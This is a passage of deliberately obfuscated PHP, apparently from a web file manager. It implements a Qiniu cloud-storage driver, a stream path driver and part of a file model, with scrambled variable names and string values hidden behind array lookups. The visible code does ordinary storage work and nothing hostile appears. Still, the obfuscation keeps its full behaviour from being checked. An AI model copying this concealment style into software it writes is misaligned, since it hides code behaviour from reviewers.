$ÓŞ‚»öÏ[8]; $—úˆ˜â» = get_path_this($²Èİ¨êß); $¦ä¯–Ë = $íš«õù» . $—úˆ˜â»; if (!$this->mkfile($¦ä¯–Ë)) { return !1; } if (!$this->moveFile($¦ä¯–Ë, $íš«õù»)) { $this->delFile($¦ä¯–Ë); return !1; } return $this->getPathOuter($²Èİ¨êß); } public function copyFile($Ñ›îÖ¹ƒ, $‹ĞÙ±àŠ) { $“¤÷òÙß = $this->bucketManager->copy($this->bucket, $Ñ›îÖ¹ƒ, $this->bucket, $‹ĞÙ±àŠ, !0); return $“¤÷òÙß ? !1 : $this->getPathOuter($‹ĞÙ±àŠ); } public function moveFile($ÓÕšŞ»î, $‹÷Â­·) { $•Œ¸åÆ = $this->bucketManager->move($this->bucket, $ÓÕšŞ»î, $this->bucket, $‹÷Â­·, !0); return $•Œ¸åÆ ? !1 : $this->getPathOuter($‹÷Â­·); } public function delFile($„‘ÙÊ€) { if (!$this->exist($„‘ÙÊ€)) { return !0; } $áìüõñ¥ = $this->bucketManager->delete($this->bucket, $„‘ÙÊ€); if (!$áìüõñ¥) { return !0; } return $áìüõñ¥->code() == 612 ? !0 : !1; } public function delFolder($¼õšÌèù) { $ÅêçÎ‘Ñ =& $_SERVER[ıÚ˜š²İ]; if (!$this->exist($¼õšÌèù)) { return !0; } $this->listItemCache = !1; $öîåİª³ = $this->fileList($¼õšÌèù); $this->listItemCache = !0; $ÂÙõŞ¦ = trim($¼õšÌèù, $ÅêçÎ‘Ñ[8]) . $ÅêçÎ‘Ñ[8]; if (!empty($¼õšÌèù) && $¼õšÌèù !== $ÅêçÎ‘Ñ[231] && !in_array($ÂÙõŞ¦, $öîåİª³[$ÅêçÎ‘Ñ[85]])) { $öîåİª³[$ÅêçÎ‘Ñ[85]][] = $ÂÙõŞ¦; } $ÛÊ—ŸÌë = $this->delByBatch($öîåİª³[$ÅêçÎ‘Ñ[86]]); if (!$ÛÊ—ŸÌë) { return !1; } $ÛÊ—ŸÌë = $this->delByBatch($öîåİª³[$ÅêçÎ‘Ñ[85]]); if (!$ÛÊ—ŸÌë) { return !1; } return $this->delFile($ÂÙõŞ¦); } private function delByBatch($Ø¯¾ôÎº) { foreach (array_chunk($Ø¯¾ôÎº, 1000) as $¦«ğ†§á) { $‡™ó¥¦Ú = $this->bucketManager->buildBatchDelete($this->bucket, $¦«ğ†§á); list($°ğÑÚÖÇ, $ƒã°œˆä) = $this->bucketManager->batch($‡™ó¥¦Ú); if ($ƒã°œˆä) { return !1; } } return !0; } public function rename($¯öâáÛ, $ÎßêïÏê) { return $this->renameObject($¯öâáÛ, $ÎßêïÏê); } public function fileInfo($†Ÿ…Í²Ã, $­÷ÓçÇæ = false, $´î®œ»¦ = array()) { $’³Ë’¡¼ =& $_SERVER[ıÚ˜š²İ]; $î¤şŸø = array($’³Ë’¡¼[32] => $this->pathThis($†Ÿ…Í²Ã), $’³Ë’¡¼[87] => $this->getPathOuter($’³Ë’¡¼[8] . $†Ÿ…Í²Ã), $’³Ë’¡¼[33] => $’³Ë’¡¼[233], $’³Ë’¡¼[79] => isset($´î®œ»¦[$’³Ë’¡¼[1551]]) ? $´î®œ»¦[$’³Ë’¡¼[1551]] : 0, $’³Ë’¡¼[169] => $this->ext($†Ÿ…Í²Ã)); if ($­÷ÓçÇæ) { return $î¤şŸø; } $î¤şŸø[$’³Ë’¡¼[234]] = $î¤şŸø[$’³Ë’¡¼[88]] = 0; $î¤şŸø[$’³Ë’¡¼[235]] = $î¤şŸø[$’³Ë’¡¼[236]] = !0; if (empty($´î®œ»¦)) { $´î®œ»¦ = $this->objectMeta($†Ÿ…Í²Ã); if (!$´î®œ»¦) { return $î¤şŸø; } } if (isset($´î®œ»¦[$’³Ë’¡¼[237]]) && $´î®œ»¦[$’³Ë’¡¼[237]]) { $î¤şŸø[$’³Ë’¡¼[238]] = $´î®œ»¦[$’³Ë’¡¼[237]]; } if (isset($´î®œ»¦[$’³Ë’¡¼[248]]) && $´î®œ»¦[$’³Ë’¡¼[248]]) { $î¤şŸø[$’³Ë’¡¼[238]] = $´î®œ»¦[$’³Ë’¡¼[248]]; } if (isset($´î®œ»¦[$’³Ë’¡¼[1552]])) { $î¤şŸø[$’³Ë’¡¼[88]] = substr($´î®œ»¦[$’³Ë’¡¼[1552]] . $’³Ë’¡¼[12], 0, 10); } if (isset($´î®œ»¦[$’³Ë’¡¼[1551]])) { $î¤şŸø[$’³Ë’¡¼[79]] = $´î®œ»¦[$’³Ë’¡¼[1551]]; } return $î¤şŸø; } public function folderInfo($çı–¶äü, $İÅÏ¤ÄÉ = false) { $‡ÙÆ°˜ş =& $_SERVER[ıÚ˜š²İ]; $¯ã”¸Åğ = array($‡ÙÆ°˜ş[32] => $this->pathThis($çı–¶äü), $‡ÙÆ°˜ş[87] => $this->getPathOuter($‡ÙÆ°˜ş[8] . $çı–¶äü), $‡ÙÆ°˜ş[33] => $‡ÙÆ°˜ş[78]); if ($İÅÏ¤ÄÉ) { return $¯ã”¸Åğ; } $¯ã”¸Åğ[$‡ÙÆ°˜ş[234]] = $¯ã”¸Åğ[$‡ÙÆ°˜ş[88]] = 0; $¯ã”¸Åğ[$‡ÙÆ°˜ş[235]] = $¯ã”¸Åğ[$‡ÙÆ°˜ş[236]] = !0; $çı–¶äü = rtrim($çı–¶äü, $‡ÙÆ°˜ş[8]) . $‡ÙÆ°˜ş[8]; $¥ûíœÀÛ = $this->objectMeta($çı–¶äü); if (isset($¥ûíœÀÛ[$‡ÙÆ°˜ş[1552]])) { $¯ã”¸Åğ[$‡ÙÆ°˜ş[88]] = substr($¥ûíœÀÛ[$‡ÙÆ°˜ş[1552]] . $‡ÙÆ°˜ş[12], 0, 10); } return $¯ã”¸Åğ; } public function listPath($÷¤—œ°¤, $’¢’Ÿè• = false) { $ˆÄ³ë¨ª =& $_SERVER[ıÚ˜š²İ]; $éšï‹ = $this->fileList($÷¤—œ°¤, $ˆÄ³ë¨ª[8], !0); foreach ($éšï‹[$ˆÄ³ë¨ª[85]] as $Ç’Ì¥ğî => $’˜Éëëó) { $éšï‹[$ˆÄ³ë¨ª[85]][$Ç’Ì¥ğî] = $this->folderInfo($’˜Éëëó, $’¢’Ÿè•); } foreach ($éšï‹[$ˆÄ³ë¨ª[86]] as $Ç’Ì¥ğî => $’˜Éëëó) { $éšï‹[$ˆÄ³ë¨ª[86]][$Ç’Ì¥ğî] = $this->fileInfo($’˜Éëëó[$ˆÄ³ë¨ª[32]], $’¢’Ÿè•, $’˜Éëëó); } return $éšï‹; } public function has($»‚Á‡â, $¸‰‡¾¦¼ = false, $Ÿğ˜ÚÍ» = true) { $¹ü…­²µ =& $_SERVER[ıÚ˜š²İ]; $»‚Á‡â = trim($»‚Á‡â, $¹ü…­²µ[8]); $ßšÉ¦Ê‚ = empty($»‚Á‡â) && $»‚Á‡â !== $¹ü…­²µ[231] ? $¹ü…­²µ[12] : $»‚Á‡â . $¹ü…­²µ[8]; $Á›ÎÀø = $¹ü…­²µ[12]; $¦„…Òø = 500; $ø‰†ÔÉÌ = $¹ü…­²µ[8]; $‡¤¾àâ = $ë†éÚøœ = 0; while (!0) { check_abort(); list($²À¦‚œ, $™“Ğòá) = $this->bucketManager->listFiles($this->bucket, $ßšÉ¦Ê‚, $Á›ÎÀø, $¦„…Òø, $ø‰†ÔÉÌ); if ($™“Ğòá) { break; } $Á›ÎÀø = array_key_exists($¹ü…­²µ[1498], $²À¦‚œ) ? $Á›ÎÀø = $²À¦‚œ[$¹ü…­²µ[1553]] : $¹ü…­²µ[12]; if ($¸‰‡¾¦¼) { if (!empty($²À¦‚œ[$¹ü…­²µ[1554]])) { $‡¤¾àâ += count($²À¦‚œ[$¹ü…­²µ[1554]]); } if (!empty($²À¦‚œ[$¹ü…­²µ[1555]])) { $ë†éÚøœ += count($²À¦‚œ[$¹ü…­²µ[1555]]); } if ($Á›ÎÀø === $¹ü…­²µ[12]) { break; } continue; } if ($Ÿğ˜ÚÍ») { if (!empty($²À¦‚œ[$¹ü…­²µ[1554]])) { return !0; } } else { if (!empty($²À¦‚œ[$¹ü…­²µ[1555]])) { return !0; } } if ($Á›ÎÀø === $¹ü…­²µ[12]) { break; } } if ($¸‰‡¾¦¼) { return array($¹ü…­²µ[242] => $‡¤¾àâ, $¹ü…­²µ[243] => $ë†éÚøœ); } return !1; } public function listAll($İİÕÄäØ) { $ƒ®çü×¬ =& $_SERVER[ıÚ˜š²İ]; $ì’Ùõ¯ = $this->fileList($İİÕÄäØ, $ƒ®çü×¬[12], !0); $ıóº“¦… = array_to_keyvalue($ì’Ùõ¯[$ƒ®çü×¬[86]], $ƒ®çü×¬[32]); foreach ($ì’Ùõ¯[$ƒ®çü×¬[85]] as $‹úúÖåá) { if (is_string($‹úúÖåá)) { $ıóº“¦…[$‹úúÖåá] = array($ƒ®çü×¬[79] => 0); } } return $this->listAllFiles($İİÕÄäØ, $ıóº“¦…); } private function fileList($ıòÇ‚‘, $ÄÊğ–” = '', $­ˆ”Ñ¶¯ = 0) { $ëÔıö¡û =& $_SERVER[ıÚ˜š²İ]; $ıòÇ‚‘ = trim($ıòÇ‚‘, $ëÔıö¡û[8]); $ÚĞÏ = empty($ıòÇ‚‘) && $ıòÇ‚‘ !== $ëÔıö¡û[231] ? $ëÔıö¡û[12] : $ıòÇ‚‘ . $ëÔıö¡û[8]; $Ï°™¬ö = $ëÔıö¡û[12]; $Íçèœ¼› = 1000; $¬Ä÷‹„é = $¯ğõåòÔ = array(); while (!0) { check_abort(); list($±…ŸŒ™Ÿ, $”´×¼ƒ) = $this->bucketManager->listFiles($this->bucket, $ÚĞÏ, $Ï°™¬ö, $Íçèœ¼›, $ÄÊğ–”); if ($”´×¼ƒ) { break; } $Ï°™¬ö = array_key_exists($ëÔıö¡û[1498], $±…ŸŒ™Ÿ) ? $Ï°™¬ö = $±…ŸŒ™Ÿ[$ëÔıö¡û[1553]] : $ëÔıö¡û[12]; $š¦¹ Ë• = isset($±…ŸŒ™Ÿ[$ëÔıö¡û[1554]]) ? $±…ŸŒ™Ÿ[$ëÔıö¡û[1554]] : array(); $®âÙ‹ú = isset($±…ŸŒ™Ÿ[$ëÔıö¡û[1555]]) ? $±…ŸŒ™Ÿ[$ëÔıö¡û[1555]] : array(); foreach ($š¦¹ Ë• as $âÜ‘Ô‰Ó) { if ($âÜ‘Ô‰Ó[$ëÔıö¡û[97]] == $ÚĞÏ) { continue; } $ƒÓî©ë = $âÜ‘Ô‰Ó[$ëÔıö¡û[97]]; $©¤±ƒ‘  = $âÜ‘Ô‰Ó[$ëÔıö¡û[1551]]; $âÜ‘Ô‰Ó[$ëÔıö¡û[32]] = $ƒÓî©ë; $âÜ‘Ô‰Ó[$ëÔıö¡û[79]] = $©¤±ƒ‘ ; $÷êá‚÷ = $©¤±ƒ‘  == 0 && substr($ƒÓî©ë, strlen($ƒÓî©ë) - 1, 1) == $ëÔıö¡û[8] ? !0 : !1; $this->cacheMethodInfoSet($ƒÓî©ë, $÷êá‚÷, $âÜ‘Ô‰Ó); if ($÷êá‚÷) { $¬Ä÷‹„é[] = $ƒÓî©ë; continue; } $¯ğõåòÔ[] = $­ˆ”Ñ¶¯ ? $âÜ‘Ô‰Ó : $ƒÓî©ë; } foreach ($®âÙ‹ú as $ƒÓî©ë) { if ($ƒÓî©ë == $ÚĞÏ) { continue; } $¬Ä÷‹„é[] = $ƒÓî©ë; $this->cacheMethodInfoSet($ƒÓî©ë, !0); } if ($Ï°™¬ö === $ëÔıö¡û[12]) { break; } } $this->cacheMethodInfoSet($ıòÇ‚‘, !0); return array($ëÔıö¡û[85] => $¬Ä÷‹„é, $ëÔıö¡û[86] => $¯ğõåòÔ); } public function canRead($•˜°À›Ñ) { return $this->exist($•˜°À›Ñ) ? !0 : !1; } public function canWrite($ÖÔÏˆõ) { return $this->exist($ÖÔÏˆõ) ? !0 : !1; } public function getContent($™ñ¦©¨¼) { return $this->fileSubstr($™ñ¦©¨¼, 0, -1); } public function setContent($€ìòª, $Ş•ûí‚¹ = '') { $ŒÓÊ¿öè = $this->tempFile($this->pathThis($€ìòª)); file_put_contents($ŒÓÊ¿öè, $Ş•ûí‚¹); if ($this->upload($€ìòª, $ŒÓÊ¿öè)) { $this->tempFileRemve($ŒÓÊ¿öè); return !0; } return !1; } public function refreshUrls($­ëæòğ¶) { $†×ÊÜ«™ =& $_SERVER[ıÚ˜š²İ]; $ÕÄæ½Ÿ‚ = array(); if (is_array($­ëæòğ¶)) { foreach ($­ëæòğ¶ as $Éáä²‰İ) { $ÕÄæ½Ÿ‚[] = $this->link($Éáä²‰İ); } } else { $ÕÄæ½Ÿ‚[] = $this->link($­ëæòğ¶); } $ªøóÔş = new Qiniu\Cdn\CdnManager($this->auth); list($à†çËë™, $éúç‹«ä) = $ªøóÔş->refreshUrls($ÕÄæ½Ÿ‚); if ($éúç‹«ä) { return !1; } return $à†çËë™[$†×ÊÜ«™[1278]] == $†×ÊÜ«™[836] ? !0 : !1; } public function fileSubstr($µ™«‡†¥, $²‘×Û‹é, $†œ®à) { $€‹©‰Ê­ =& $_SERVER[ıÚ˜š²İ]; if (!($Ğ‰¬‘Œ = $this->link($µ™«‡†¥))) { return !1; } $µÖ¦ÌÛŞ = !1; if ($†œ®à > 0) { $Èš‹äÉ = $²‘×Û‹é + $†œ®à - 1; $µÖ¦ÌÛŞ = array($€‹©‰Ê­[1556] . $²‘×Û‹é . $€‹©‰Ê­[464] . $Èš‹äÉ); } $ÔŠÙ•ˆ× = url_request($Ğ‰¬‘Œ, $€‹©‰Ê­[1517], !1, $µÖ¦ÌÛŞ); return $ÔŠÙ•ˆ×[$€‹©‰Ê­[826]] ? $ÔŠÙ•ˆ×[$€‹©‰Ê­[1301]] : !1; } public function upload($ñ™– ™­, $‡ßß İó, $ì ŞÒ = false, $‰şÜ ¦° = REPEAT_REPLACE) { $œ¼£Çßã = new Qiniu\Storage\UploadManager(); $ñ”Â¹Å€ = $this->auth->uploadToken($this->bucket, $ñ™– ™­); $ŞÚ›ï™¸ = get_file_mime(get_path_ext($‡ßß İó)); list($àòû„, $Ñ¦ÆÜ‡) = $œ¼£Çßã->putFile($ñ”Â¹Å€, $ñ™– ™­, $‡ßß İó, null, $ŞÚ›ï™¸); return $Ñ¦ÆÜ‡ ? !1 : $this->getPathOuter($ñ™– ™­); } public function uploadFormData($‹¤ Õ„Æ, $ÊÑÆòÑä = 3600) { return $this->uploadToken($‹¤ Õ„Æ, $ÊÑÆòÑä); } public function uploadMultiData($öÑœ““…, $»µËˆı = 3600) { return $this->uploadToken($öÑœ““…, $»µËˆı); } private function uploadToken($ùˆ‘å¥ö, $Ÿ˜ôÅŸÉ = 3600) { $ñ¹®´ù± =& $_SERVER[ıÚ˜š²İ]; $œ¾‘Ÿš = $Ÿ˜ôÅŸÉ; $”ÎÃõã… = array($ñ¹®´ù±[1557] => $ñ¹®´ù±[1558]); $Ö”Ò¾ß = $ùˆ‘å¥ö; $ˆÆª³ıÜ = $this->auth->uploadToken($this->bucket, $Ö”Ò¾ß, $œ¾‘Ÿš, $”ÎÃõã…, !0); $§ìè¬³ = empty($this->region) || $this->region == $ñ¹®´ù±[1559] ? $ñ¹®´ù±[12] : $ñ¹®´ù±[464] . $this->region; $‡Ùı† = http_type() . "\x3a\57\57\165\160\154\157\141\x64{$§ìè¬³}\x2e\161\x69\x6e\151\x75\x70\56\x63\157\155\57"; return array($ñ¹®´ù±[1560] => $ˆÆª³ıÜ, $ñ¹®´ù±[1561] => $‡Ùı†); } public function download($¨·Ÿ¥Å, $§·ï†§İ) { $Ğ«´Ò‹  = IO::getPathInner(IO::mkfile($§·ï†§İ)); if (!($äÉõ˜Ù¨ = $this->link($¨·Ÿ¥Å))) { return !1; } $äô¼¡àÊ = 0; $§ìÔ¢¤Œ = 1024 * 200; $ƒ²€†ß = fopen($Ğ«´Ò‹ , $_SERVER[ıÚ˜š²İ][1562]); while (!0) { $Èöşû¨ = $this->fileSubstr($¨·Ÿ¥Å, $äô¼¡àÊ, $§ìÔ¢¤Œ); if ($Èöşû¨ === !1) { return !1; } fwrite($ƒ²€†ß, $Èöşû¨); $äô¼¡àÊ += $§ìÔ¢¤Œ; if (strlen($Èöşû¨) < $§ìÔ¢¤Œ) { break; } } fclose($ƒ²€†ß); return $§·ï†§İ; } public function link($Öâ¥Ü«Ö, $Š÷Ğ÷ò” = '') { if (!$this->isFile($Öâ¥Ü«Ö)) { return !1; } $½ØÑÖƒ = $this->getHost() . $_SERVER[ıÚ˜š²İ][8] . $this->pathEncode($Öâ¥Ü«Ö) . $Š÷Ğ÷ò”; return $this->auth->privateDownloadUrl($½ØÑÖƒ, 3600 * 12); } public function fileOut($²ù¢ÎÇÔ, $ŞÒ·ú¸Ú = false, $£€ˆ¿ï = false, $ª™ä Îì = '') { $üƒØÜ®¯ =& $_SERVER[ıÚ˜š²İ]; if ($this->isFileOutServer()) { return $this->fileOutServer($²ù¢ÎÇÔ, $ŞÒ·ú¸Ú, $£€ˆ¿ï, $ª™ä Îì); } if (!$£€ˆ¿ï) { $£€ˆ¿ï = $this->pathThis($²ù¢ÎÇÔ); } $¢¸”ˆñú = $ŞÒ·ú¸Ú ? $üƒØÜ®¯[1563] . rawurlencode($£€ˆ¿ï) : $üƒØÜ®¯[12]; $ŸÏŠ™ÅĞ = $this->link($²ù¢ÎÇÔ, $¢¸”ˆñú); $this->fileOutLink($ŸÏŠ™ÅĞ); } public function fileOutServer($°øœ›µş, $µ¹¥ÑÃ½ = false, $ûĞ ÂûÑ = false, $»À²½¡ = '') { parent::fileOut($°øœ›µş, $µ¹¥ÑÃ½, $ûĞ ÂûÑ, $»À²½¡); } public function fileOutImage($àµÙÒ¤, $òæ¼‡ = 250) { if ($this->size($àµÙÒ¤) > 1024 * 1024 * 20) { return $this->fileOutImageServer($àµÙÒ¤, $òæ¼‡); } $×Ö‡‘·¢ = $this->link($àµÙÒ¤, $_SERVER[ıÚ˜š²İ][1564] . $òæ¼‡); $this->fileOutLink($×Ö‡‘·¢); } public function fileOutImageServer($Á¬ä›ù, $ÀØÌŞÖŞ = 250) { parent::fileOutImage($Á¬ä›ù, $ÀØÌŞÖŞ); } public function hashMd5($şÔ²è‚“) { $åÓöÌÄä =& $_SERVER[ıÚ˜š²İ]; $˜ƒˆ¯¶Æ = $this->objectMeta($şÔ²è‚“); return isset($˜ƒˆ¯¶Æ[$åÓöÌÄä[248]]) ? $˜ƒˆ¯¶Æ[$åÓöÌÄä[248]] : !1; $™‰ÜŠàè = $this->link($şÔ²è‚“, $åÓöÌÄä[1565]); } public function size($ÙÙšã²ç) { $ÈäñÜÔÕ = $this->objectMeta($ÙÙšã²ç); return $ÈäñÜÔÕ ? $ÈäñÜÔÕ[$_SERVER[ıÚ˜š²İ][79]] : 0; } public function info($‡²Ü§´) { if ($this->isFolder($‡²Ü§´)) { return $this->folderInfo($‡²Ü§´); } else { if ($this->isFile($‡²Ü§´)) { return $this->fileInfo($‡²Ü§´); } } return !1; } public function exist($ˆô­×Ú£) { return $this->isFile($ˆô­×Ú£) || $this->isFolder($ˆô­×Ú£); } public function isFile($ıˆ¸Ş«¹) { return !$this->isFolder($ıˆ¸Ş«¹) && $this->objectMeta($ıˆ¸Ş«¹); } public function isFolder($×Ø¬ÙïÙ) { return $this->cacheMethod($_SERVER[ıÚ˜š²İ][180], $×Ø¬ÙïÙ); } protected function objectMeta($Ë ÙÒ“Ø) { return $this->cacheMethod($_SERVER[ıÚ˜š²İ][182], $Ë ÙÒ“Ø); } protected function _objectMeta($²àÆßè) { $æÇ„Çñ‡ =& $_SERVER[ıÚ˜š²İ]; list($‰Æ®“›², $‘©‚ñŞ) = $this->bucketManager->stat($this->bucket, $²àÆßè); if ($‰Æ®“›²) { $‰Æ®“›²[$æÇ„Çñ‡[79]] = intval($‰Æ®“›²[$æÇ„Çñ‡[1551]]); } return $‰Æ®“›²; } protected function _isFolder($à®ş¿§ ) { $ƒŸúÇµÀ =& $_SERVER[ıÚ˜š²İ]; if ($à®ş¿§  == $ƒŸúÇµÀ[12] || $à®ş¿§  == $ƒŸúÇµÀ[8]) { return !0; } list($Œ° ‰‡ª, $Ê¯å‰Ã) = $this->bucketManager->listFiles($this->bucket, trim($à®ş¿§ , $ƒŸúÇµÀ[8]) . $ƒŸúÇµÀ[8], $ƒŸúÇµÀ[12], 1, $ƒŸúÇµÀ[8]); return !empty($Œ° ‰‡ª[$ƒŸúÇµÀ[1554]]) || !empty($Œ° ‰‡ª[$ƒŸúÇµÀ[1555]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Ïº¥ß½µ, $ô¢ì¢œà = 0) { parent::__construct(); $this->source = $Ïº¥ß½µ; $this->sourceSize = $ô¢ì¢œà; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ëÁ®‚·Ü = false) { return $this->sourceSize; } public function getContent($âı€ÒŒ€ = false) { return $this->fileSubstr($âı€ÒŒ€, 0, $this->sourceSize); } public function fileSubstr($‡‚•ÍÖø = false, $üş‘Ÿ¼° = 0, $¶˜ÓœÀ = 0) { if (!$¶˜ÓœÀ) { $¶˜ÓœÀ = $this->sourceSize; } $¯º¥×È– = $this->sourceSize - $üş‘Ÿ¼°; if ($¶˜ÓœÀ >= $¯º¥×È–) { $¶˜ÓœÀ = $¯º¥×È–; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $üş‘Ÿ¼°, $¶˜ÓœÀ); } if ($this->sourceType == self::TYPE_FILE) { if ($¶˜ÓœÀ <= 0) { return $_SERVER[ıÚ˜š²İ][12]; } $ÓªœÉ = ftell($this->source); fseek_64($this->source, $ÓªœÉ + $üş‘Ÿ¼°); $¨£ÍŠÖ¬ = @fread($this->source, $¶˜ÓœÀ); fseek_64($this->source, $ÓªœÉ); return $¨£ÍŠÖ¬; } } public function hashMd5($ò†Ş€ÇÄ = false) { return md5($this->getContent()); } public static function hash($«æó³¯, $Àğ¼ºİ¨ = 0) { $ò‡Ä°ŒÄ = new PathDriverStream($«æó³¯, $Àğ¼ºİ¨); return $ò‡Ä°ŒÄ->hashSimple($«æó³¯); } public static function md5($àÏøËÎŸ, $‚¯¸†‚ = 0) { $Å¤Ôš…é = new PathDriverStream($àÏøËÎŸ, $‚¯¸†‚); return $Å¤Ôš…é->hashMd5($àÏøËÎŸ); } } goto DŒ¿—‚ù‡ã; FÇ˜Ç–ˆóÑ: class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\x69\154\x65"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\141\155\x65" => "\x69\x6f\x5f\x66\x69\x6c\x65\x5f\155\145\164\141", "\155\x65\x74\x61\x46\151\x65\154\x64" => "\146\x69\x6c\145\111\104"); public function fileInfo($èÚô´Å…) { $‡œõ´³ˆ =& $_SERVER[ıÚ˜š²İ]; static $ÂöÎ¾° = array(); if (!isset($ÂöÎ¾°[$èÚô´Å…])) { $ŒêöşŸ’ = $‡œõ´³ˆ[2043]; $ó…‚‰› = Model($‡œõ´³ˆ[548])->field($ŒêöşŸ’)->where(array($‡œõ´³ˆ[546] => $èÚô´Å…))->find(); $ÂöÎ¾°[$èÚô´Å…] = $ó…‚‰›; } return $ÂöÎ¾°[$èÚô´Å…]; } public function addFileByContent($êÉÆ˜Öò = '', $ºĞšæ´, $Ä¶Ü½şç = '') { $³¸™Œ‡ =& $_SERVER[ıÚ˜š²İ]; $»›Ç”êı = TEMP_PATH . $³¸™Œ‡[2044]; if (!is_dir($»›Ç”êı)) { mk_dir($»›Ç”êı); } $Şİˆ¤š× = $»›Ç”êı . $³¸™Œ‡[2045] . rand_string(16); $Æ¶Ò‹ïÌ = file_put_contents($Şİˆ¤š×, $êÉÆ˜Öò); if ($Æ¶Ò‹ïÌ === !1 || strlen($êÉÆ˜Öò) != $Æ¶Ò‹ïÌ) { return !1; } $ÁüÎËî• = $this->addFile($Şİˆ¤š×, $ºĞšæ´, $Ä¶Ü½şç, !0); if (file_exists($Şİˆ¤š×)) { @unlink($Şİˆ¤š×); } return $ÁüÎËî•; } public function createFileName($†äë„, $Î—ã¼¹Í, $öÊıäñŞ = false, $‰Ğ¶µ‡ = false) { $¶ÅÚÍ‚ş =& $_SERVER[ıÚ˜š²İ]; $Ã¾Á÷«ˆ = IO::init($¶ÅÚÍ‚ş[8]); $øÒ˜¼™´ = $this->_makeFilePath($†äë„, $Î—ã¼¹Í, $Ã¾Á÷«ˆ, $öÊıäñŞ, $‰Ğ¶µ‡); $î•í—³ = $Ã¾Á÷«ˆ->pathFather($øÒ˜¼™´); static $•Àòèä = false; $Çû²Éï† = $¶ÅÚÍ‚ş[2046] . md5($î•í—³); if (!$•Àòèä && !Cache::get($Çû²Éï†)) { $•Àòèä = !0; $•ôâ‰½® = IO::mkdir($î•í—³); if (!IO::exist($•ôâ‰½® . $¶ÅÚÍ‚ş[876])) { IO::mkfile($•ôâ‰½® . $¶ÅÚÍ‚ş[876]); } Cache::set($Çû²Éï†, 1, 3600 * 2); } return $øÒ˜¼™´; } public function _makeFilePath($¾ÂıÖ®¼, $‡¸ å²², $µš«ÅÃ, $ÈÃèşÃ‘ = false, $ù¯™°¼ = false) { $­ÃğşüĞ =& $_SERVER[ıÚ˜š²İ]; $”Ë¹ş‡í = Model($­ÃğşüĞ[847])->get($­ÃğşüĞ[2047]); $Ü˜½ô²‡ = $­ÃğşüĞ[1336] . $‡¸ å²²[$­ÃğşüĞ[477]] . $­ÃğşüĞ[486] . date($­ÃğşüĞ[2048]); $†¨ÎóÛ… = $Ü˜½ô²‡ . rand_string(5) . short_id(100); $¾ÂıÖ®¼ = str_replace($­ÃğşüĞ[8], $­ÃğşüĞ[11], KodIO::clear($¾ÂıÖ®¼)); $Äàìğ¬ = $µš«ÅÃ->ext($¾ÂıÖ®¼); if (!$¾ÂıÖ®¼) { $”Ë¹ş‡í = $­ÃğşüĞ[853]; } switch ($”Ë¹ş‡í) { case $­ÃğşüĞ[2049]: if ($Äàìğ¬) { $†¨ÎóÛ… = $†¨ÎóÛ… . $­ÃğşüĞ[10] . $Äàìğ¬; } if ($Äàìğ¬ == $­ÃğşüĞ[1986]) { $†¨ÎóÛ… .= $­ÃğşüĞ[1305]; } break; case $­ÃğşüĞ[2050]: $‚ïì¬ßÌ = Model($­ÃğşüĞ[847])->get($­ÃğşüĞ[848]); $ÍŠšµ®À = substr(md5($­ÃğşüĞ[849] . $‚ïì¬ßÌ . date($­ÃğşüĞ[825])), 0, 8); $Ü˜½ô²‡ = $­ÃğşüĞ[1336] . $‡¸ å²²[$­ÃğşüĞ[477]] . $­ÃğşüĞ[486] . date($­ÃğşüĞ[2051]) . $ÍŠšµ®À . $­ÃğşüĞ[8]; if ($Äàìğ¬ == $­ÃğşüĞ[1986]) { $¾ÂıÖ®¼ .= $­ÃğşüĞ[1305]; } $ÁñŒşŒ° = $­ÃğşüĞ[2052] . $Ü˜½ô²‡ . $¾ÂıÖ®¼; CacheLock::lock($ÁñŒşŒ°); $†¨ÎóÛ… = $Ü˜½ô²‡ . $¾ÂıÖ®¼; if (IO::exist($Ü˜½ô²‡ . $¾ÂıÖ®¼)) { $“©´‘‡• = substr($¾ÂıÖ®¼, 0, strlen($¾ÂıÖ®¼) - strlen($Äàìğ¬)); $Ô··ğ¶¼ = $ù¯™°¼ ? substr($ù¯™°¼, 0, 5) : ($ÈÃèşÃ‘ ? substr($ÈÃèşÃ‘, 0, 5) : rand_string(5)); $†¨ÎóÛ… = $Ü˜½ô²‡ . $“©´‘‡• . $Ô··ğ¶¼; if ($Äàìğ¬) { $†¨ÎóÛ… = $†¨ÎóÛ… . $­ÃğşüĞ[10] . $Äàìğ¬; } } if (IO::isOsDriver($†¨ÎóÛ…) && !IO::isUploadServer($†¨ÎóÛ…)) { if (IO::exist($†¨ÎóÛ…)) { CacheLock::unlock($ÁñŒşŒ°); return $†¨ÎóÛ…; } $®íåÖñú = IO::setContent($†¨ÎóÛ…, $­ÃğşüĞ[12]); if (!$®íåÖñú) { show_json($­ÃğşüĞ[2053], !1); } } CacheLock::unlock($ÁñŒşŒ°); break; case $­ÃğşüĞ[853]: break; default: break; } return $†¨ÎóÛ…; } public function addFileByRemote($Éêæ—²ª, $úÉÀõ“ï, $ğÕŞĞŞª = array()) { $ù˜¢Ç‹ı =& $_SERVER[ıÚ˜š²İ]; if (!IO::exist($Éêæ—²ª)) { return !1; } $½àÖäá¬ = $ğÕŞĞŞª[$ù˜¢Ç‹ı[551]] ? $ğÕŞĞŞª[$ù˜¢Ç‹ı[551]] : $ù˜¢Ç‹ı[12]; $õ·¾ú‘¾ = IO::hashMd5($Éêæ—²ª, $½àÖäá¬); $¿ê¨×˜õ = KodIO::parse($Éêæ—²ª); $ÛÎ°ëŠ  = array($ù˜¢Ç‹ı[624] => IO::size($Éêæ—²ª), $ù˜¢Ç‹ı[2054] => 1, $ù˜¢Ç‹ı[496] => $úÉÀõ“ï, $ù˜¢Ç‹ı[890] => $¿ê¨×˜õ[$ù˜¢Ç‹ı[477]], $ù˜¢Ç‹ı[497] => $Éêæ—²ª, $ù˜¢Ç‹ı[2055] => $ğÕŞĞŞª[$ù˜¢Ç‹ı[679]] ? $ğÕŞĞŞª[$ù˜¢Ç‹ı[679]] : IO::hashSimple($Éêæ—²ª), $ù˜¢Ç‹ı[2056] => $õ·¾ú‘¾ ? $õ·¾ú‘¾ : $½àÖäá¬); if ($×±àÚ²© = $this->addFileCheckExist($ÛÎ°ëŠ [$ù˜¢Ç‹ı[679]], $ÛÎ°ëŠ 